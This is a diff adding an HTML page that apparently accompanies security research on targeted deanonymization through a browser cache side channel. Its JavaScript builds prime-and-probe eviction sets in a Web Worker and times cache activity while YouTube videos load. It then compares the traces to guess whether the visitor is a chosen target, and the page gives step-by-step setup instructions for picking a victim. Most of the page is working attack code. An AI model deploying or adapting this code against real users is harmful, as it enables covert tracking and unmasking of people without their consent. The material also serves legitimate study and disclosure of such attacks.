@@ -1,0 +1,400 @@
+<html>
+    <head>
+        <title>Targeted Deanonymization via the Cache Side Channel: Online-Only Attack</title>
+        <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+        <script>
+            // normal cache occupancy channel or sweep counting?
+            const COUNT_SWEEPS = false; // if false, measure time. if true, measure how many cache sweeps we get until the clock changes. false for Win-Chrome system. Change to true for Mac-M1-Chrome system
+            
+            // Cache size constants
+            const CACHE_SETS = 8192; const CACHE_WAYS = 16; // CACHE_SETS variable is set to 8192 for Win-Chrome system. Change it to 4096 for Mac-M1-Chrome system
+            const MEASUREMENT_TIME_IN_MS = 1000; // varies depending on the setup
+            const SAMPLING_PERIOD_IN_MS = 2; // 2ms for Win-Chrome system. Change to 10ms for Mac-M1-Chrome system.
+            const SET_SKIPPING_STEP = 2;
+            
+            // Resources:
+            // Replace the SD-URL at "shared_private" with the URL pointing to your own prepared leaky resource
+            const not_shared_private = "z2Mf7huvs0Y"; // URL pointing at a private resource not shared with the victim
+            const public = "UUoHea8-M0I"; // URL pointing at a publicly accessible resource
+            let shared_private = ""; // SD-URL pointing at a resource shared privately only with the victim
+            
+            // Victim
+            let user_name="";
+
+            // Worker thread message type constants
+            const CREATE_PP_OBJECT = 1, PROBE_ALL_SETS = 2, PERFORM_MEASUREMENT = 3, DELETE_PP_OBJECT = 4;
+        </script>
+        <script id="workerSource" <!-- -->type = "javascript/worker" >
+            // worker constants
+            0; // otherwise VSCode complains...
+            const BYTES_PER_MB = 1024*1024;
+            const SETS_PER_PAGE = 64;
+            
+            // Worker thread message type constants
+            //const CREATE_PP_OBJECT = 1, PROBE_ALL_SETS = 2, PERFORM_MEASUREMENT = 3;
+            
+            // Prime and probe object
+            function PrimeProbe(sets, ways) {
+                this.evictionArray = new Uint32Array(32 * BYTES_PER_MB / Uint32Array.BYTES_PER_ELEMENT);
+                this.setHeads = new Array(SETS_PER_PAGE);
+            
+                this.probeSet = function (setOffset) {
+                    // Go over all elements in the set
+                    var pointer = this.setHeads[setOffset];
+                    var listHead = pointer;
+                    do {
+                        pointer = this.evictionArray[pointer];
+                    } while (pointer != listHead);
+                    return pointer;
+                }
+           
+                this.probeSetLimited = function (setOffset, hops) {
+                    // Go over all elements in the set
+                    var pointer = this.setHeads[setOffset];
+                    var listHead = pointer;
+                    do {
+                        pointer = this.evictionArray[pointer];
+                        hops--;
+                    } while ((hops != 0) && (pointer != listHead));
+                    return pointer;
+                }
+            
+                this.probeSets = function (sets) {
+                    // Probe some of the sets in the page
+                    for (setOffset in sets) {
+                        this.probeSet(sets[setOffset]);
+                    }
+                }
+            
+                this.probeAllSets = function(setSkippingStep) {
+                    for (var set=0;set < SETS_PER_PAGE; set += setSkippingStep) {
+                        this.probeSet(set);
+                    }
+                }
+
+                this.shuffle = function (arrayToShuffle) {
+                    var tmp, current, top = arrayToShuffle.length;
+                    if (top) while (--top) {
+                        current = Math.floor(Math.random() * (top + 1));
+                        tmp = arrayToShuffle[current];
+                        arrayToShuffle[current] = arrayToShuffle[top];
+                        arrayToShuffle[top] = tmp;
+                    }
+                    return arrayToShuffle;
+                }
+
+                this.createSetHeads = function (sets, ways) {
+                    // We have 64 set heads, each should to a list of size 128*[ways]=1536
+                    var unshuffledArray = new Uint32Array(sets / SETS_PER_PAGE);
+                    var allSetOffset = Math.log2(sets) + 4; // 17 for sets=8192, 16 for sets=4096
+                    var i;
+                    for (i = 0; i < unshuffledArray.length; i++) {
+                        unshuffledArray[i] = i;
+                    }
+                    
+                    // Shuffle the array
+                    var shuffledArray = this.shuffle(unshuffledArray);
+                    
+                    // Now write into the eviction buffer
+                    
+                    // virtual address is:
+
+                    // LLL LEEE EEEE SSSS SS00 00[00] (last 2 bits are because of UINT32 vs BYTE)
+
+                    //               ^^^^ ^^ - these 6 bits determine the set index, 64 possible values
+
+                    //               ^^^^ ^^^^ ^^ ^^ - these 12 bits (4K) are the same in physical and in virtual
+
+                    //      ^^^ ^^^^ we keep the set and change these 6/7 bits to 64/128 different values to cover all 8192=128*64 sets
+
+                    // ^^^ ^  - we use 12/16 different values for this to touch each set 12/16 times, once per line
+
+                    var set_index, element_index, line_index;
+                    var currentElement, nextElement;
+                    for (set_index = 0; set_index < SETS_PER_PAGE; set_index++) {
+                        currentElement = (shuffledArray[0] << 10) + (set_index << 4);
+                        this.setHeads[set_index] = currentElement;
+                        for (line_index = 0; line_index < ways; line_index++) {
+                            //currentElement = (line_index << 17) + (shuffledArray[0] << 10) + (set_index << 4);
+                            for (element_index = 0; element_index < sets / SETS_PER_PAGE - 1; element_index++) {
+                                nextElement = (line_index << allSetOffset) + (shuffledArray[element_index + 1] << 10) + (set_index << 4);
+                                this.evictionArray[currentElement] = nextElement;
+                                currentElement = nextElement;
+                            } // element
+                            
+                            if (line_index == ways - 1) {
+                                // In the last line, the last pointer goes to the head of the entire set
+                                nextElement = this.setHeads[set_index];
+                            } else {
+                                // Last pointer goes back to the head of the next line
+                                nextElement = ((line_index + 1) << allSetOffset) + (shuffledArray[0] << 10) + (set_index << 4);
+                            }
+
+                            this.evictionArray[currentElement] = nextElement;
+
+                            currentElement = nextElement;
+                        } // line
+                    } // set
+                };
+
+                this.createSetHeads(sets, ways);
+
+                // check that this doesn't crash/get stuck
+
+                this.probeSets([1, 2, 3, 4, 5]);
+                
+            } // PP object.
+
+            PP = {}; // new PrimeProbe(CACHE_SETS, CACHE_WAYS);
+
+            var resultArray = {}; // new Array (Math.ceil(MEASUREMENT_TIME_IN_MS / SAMPLING_PERIOD_IN_MS));
+
+            function performMeasurement(samplingPeriod, setSkippingStep, countSweeps, measurementTime) {
+                // Set up the result array
+                resultArray = new Array (Math.ceil(measurementTime / samplingPeriod));
+
+                // For each measurement period
+                var measurement_index, busySpins = 0;
+                var nextMeasurementStartTime = performance.now(), currentTime;
+
+                nextMeasurementStartTime += samplingPeriod;
+
+                // Spin until we're ready for the next measurement
+
+                do {
+                    currentTime = performance.now();
+                }
+
+                while (currentTime < nextMeasurementStartTime);
+
+                for (measurement_index = 0; measurement_index < resultArray.length; measurement_index++) {
+
+                    nextMeasurementStartTime += samplingPeriod;
+
+                    currentTime = performance.now();
+
+                    // if we've run out of time, skip the measurement
+                    if (currentTime >= nextMeasurementStartTime) {
+                        if (countSweeps == true) {
+                            resultArray[measurement_index] = 0;
+                        } else {
+                            resultArray[measurement_index] = samplingPeriod * 3; // Some arbitrarily high value...
+                        }
+                    } else {
+                        if (countSweeps == true) {
+                            var sweeps = 0;
+                            // repeatedly perform the measurement until the clock changes
+                            do {
+                                currentTime = performance.now();
+                                sweeps++;
+                                PP.probeAllSets(setSkippingStep);
+                            } while (currentTime < nextMeasurementStartTime);
+                        } else {
+                            // otherwise, perform the measurement
+                            PP.probeAllSets(setSkippingStep);
+                        }
+
+                        // Log the time it took
+                        if (countSweeps == true) {
+                            // log how many spins it took until the clock ticked again
+                            resultArray[measurement_index] = sweeps;
+
+                        } else {
+                            resultArray[measurement_index] = (performance.now() - currentTime).toFixed(3);
+                        }
+
+                        // Prepare for the next measurement
+                        do {
+                            currentTime = performance.now();
+                        }
+                        while(currentTime < nextMeasurementStartTime);
+                    }
+                }
+            }
+            
+            // Sampling:
+            onmessage = function (e) {
+
+                // Demultiplex the message from the main thread.
+                switch (e.data.type) {
+                    case 1:
+                        PP = new PrimeProbe(e.data.sets, e.data.ways);
+                        break;
+
+                    case 2:
+                        var startTime = performance.now(); 
+                        PP.probeAllSets();
+                        result.time = performance.now() - startTime;
+                        postMessage(result);
+                        break;
+                    case 3:
+                        performMeasurement(
+                            e.data.sampling_period, 
+                            e.data.set_skipping_step, 
+                            e.data.count_sweeps,
+                            e.data.measurement_time
+                        );
+                        postMessage(resultArray);
+                        break;
+                                        
+                    case 4:
+                    PP.evictionArray = null;
+                    PP = null;
+                    self.close();
+
+                } // switch
+            } // onmessage
+        </script>
+        <!-- ^^^ worker thread /////////////// vvv main code -->
+    
+        <script>
+            var count = 0;
+            var iframe;
+            var d_0 = {};
+            var d_1 = {};
+            var d_leak = {};
+            
+            var blob = new Blob([
+                    document.querySelector('#workerSource').textContent
+                ], { type: "text/javascript" });
+
+            var myWorker = new Worker(window.URL.createObjectURL(blob));
+
+            myWorker.addEventListener('message', handleMessageFromWorker);
+
+            // mean squared error
+            function mse(a, b) {
+                let error = 0
+                for (let i = 0; i < a.length; i++) {
+                    error += Math.pow((b[i] - a[i]), 2)
+                }
+                return error / a.length
+            }
+
+            // sensitive process
+            async function loadResource() {
+
+                iframe = document.createElement('iframe');
+                iframe.width = "800";
+                iframe.height = "600";
+                iframe.allow="autoplay;";
+                //iframe.style="visibility:hidden;";
+                let src_url = "";
+                if(count == 0) {
+                    src_url = "https://www.youtube.com/embed/" + not_shared_private + "?rel=0&amp;autoplay=1&mute=1";
+                } else if(count == 1) {
+                    src_url = "https://www.youtube.com/embed/" + public + "?rel=0&amp;autoplay=1&mute=1";
+                } else if(count == 2){
+                    src_url = "https://www.youtube.com/embed/" + shared_private + "?rel=0&amp;autoplay=1&mute=1";
+                }
+                iframe.src = src_url;
+                document.getElementById('resource').appendChild(iframe);
+
+                count++;
+
+                if(count <= 3) {
+                    myWorker.postMessage({type:PERFORM_MEASUREMENT, measurement_time : MEASUREMENT_TIME_IN_MS,
+                        sampling_period : SAMPLING_PERIOD_IN_MS,
+                        set_skipping_step : SET_SKIPPING_STEP,
+                        count_sweeps: COUNT_SWEEPS});
+                }
+            }
+
+            function handleMessageFromWorker(msg) {
+                
+                if(count == 1) {
+                    d_0 = msg.data;
+                } else if(count == 2) {
+                    d_1 = msg.data;
+                } else if(count == 3){
+                    d_leak = msg.data;
+                    if(mse(d_0,d_leak)<mse(d_1,d_leak)) {
+                        document.getElementById("results").textContent += "I don't think you are " + user_name;
+                    } else {
+                        document.getElementById("results").textContent += "I think you are " + user_name;
+                    }
+
+                }
+
+                if(count == 3) {
+                    iframe.remove();
+                    // myWorker.postMessage({type:DELETE_PP_OBJECT});
+                } else {
+                    if(iframe) {
+                        iframe.remove();
+                    }
+                    loadResource();
+                }
+            }
+
+            let created_pp_object = false;
+            function go() {
+
+                document.getElementById("results").innerHTML = '';
+
+                if (!created_pp_object) {
+                    created_pp_object = true;
+                    myWorker.postMessage({type:CREATE_PP_OBJECT, sets: CACHE_SETS, ways: CACHE_WAYS});
+                }
+                
+                count = 0;
+                user_name = document.getElementById("user_name").value;
+                shared_private = document.getElementById("shared_private").value;
+                loadResource();
+            }
+
+            // if(window.addEventListener) {
+            //     window.addEventListener('load',go,false); //W3C
+            // } else {
+            //     window.attachEvent('onload',go); //IE
+            // }
+        </script>
+        <style>
+              .look_like_button {
+    font: bold 24px Arial;
+    text-decoration: none;
+    color: #333333;
+    padding: 8px 24px 8px 24px;
+    border-top: 1px solid #CCCCCC;
+    border-right: 1px solid #333333;
+    border-bottom: 1px solid #333333;
+    border-left: 1px solid #CCCCCC;
+  	background: linear-gradient(-45deg, #bbbbbb 40%, #ccccff 50% ,  #bbbbbb 60%);
+    background-size: 400% 400%;
+    animation: gradient 5s ease infinite;
+}
+
+
+@keyframes gradient {
+	0% {
+		background-position: 0% 50%;
+	}
+	50% {
+		background-position: 100% 50%;
+	}
+	100% {
+		background-position: 0% 50%;
+	}
+}
+
+        </style>
+    </head>
+    <body id="body">
+        <h1>Targeted Deanonymization via the Cache Side Channel: Online-Only Attack</h1>
+        <br>
+        <div>
+            To customize the targeted deanonymization demo for a target user of your choice, do the following:
+            <p>1. Upload a private video to Youtube and share it only with the user you'd like to track -- see the guide here for more instructions: <a href="https://support.google.com/youtube/answer/157177">https://support.google.com/youtube/answer/157177</a></p>
+            <p>2. Write down the identifier of the private video you created: <input id="shared_private" size=100 value="w1q-ZpGR2wQ"/>
+            <p>3. Write down the email address of the user: <input id="user_name" size=100 value="clark.kent@dailyplanet.com"/>
+            <p>4. Press go:         <button class="look_like_button" onclick="go()">GO!</button>
+
+
+        <div>
+        <div id="results" style="width:100%; word-wrap: break-word; font-weight: bold;"></div>
+        <br>
+        <div id="resource"></div>
+        <div>For more information, see <a href="https://github.com/leakuidatorplusteam/artifacts">https://github.com/leakuidatorplusteam/artifacts</a></div>
+    </body>
+</html>
+
